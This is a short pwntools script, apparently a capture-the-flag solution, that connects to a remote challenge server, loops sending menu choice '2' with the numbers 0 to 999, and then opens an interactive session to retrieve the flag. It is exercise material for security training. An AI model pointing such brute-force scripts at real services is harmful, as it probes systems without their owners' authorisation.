from pwn import *
#r = process(["./n"])
r = remote("challs.htsp.ro", 8002)

for n in range(1000):
    r.sendline(f"2\n{n}".encode())

# then just get flag
r.interactive()
